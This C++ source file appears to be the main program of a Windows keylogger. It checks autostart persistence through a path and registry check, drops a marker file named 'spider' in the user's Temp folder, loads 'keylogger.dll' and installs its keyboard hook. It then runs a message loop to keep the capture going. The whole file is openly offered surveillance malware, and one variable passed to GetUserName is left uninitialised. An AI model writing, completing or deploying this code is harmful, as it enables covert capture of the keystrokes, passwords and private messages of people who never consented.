#include <iostream>
#include <string>
#include <thread>

#include <Lmcons.h>

#include "Dispatcher.hpp"
#include <Windows.h>

#include "AutoStart.hpp"

typedef void(__stdcall *pFunc)(void);
typedef bool(__stdcall *hook)(Dispatcher *);

int	main(int ac, char **av)
{
	AutoStart start(av[0]);
	MSG msg;
	HMODULE hDll = NULL;
	hook ptrHook = NULL;
	pFunc ptrFunc = NULL;

	SetLastError(0);

	start.verifyPath();
	start.verifyRegister();

	HANDLE file;
	char username[UNLEN + 1];
	DWORD size;

	if (GetUserName(username, &size) == 0)
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
		return (0);
	}

	std::string tmp("C:\\Users\\");

	tmp.append(username);
	tmp.append("\\AppData\\Local\\Temp\\spider");

	if ((file = CreateFile(tmp .c_str(), GENERIC_WRITE, 0, NULL,
		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
		return (0);
	}

	if ((hDll = LoadLibrary("keylogger.dll")) == NULL
		|| (ptrHook = (hook)GetProcAddress(hDll, "SetHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
		return (1);
	}

	if (ptrHook(new Dispatcher) == false)
		return (1);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (msg.message == WM_QUIT || msg.message == WM_DESTROY || msg.message == WM_CLOSE)
			break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if ((ptrFunc = (pFunc)GetProcAddress(hDll, "RemoveHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		return (1);
	}
	ptrFunc();
	FreeLibrary(hDll);
	DeleteFile(tmp.c_str());
	return (0);
}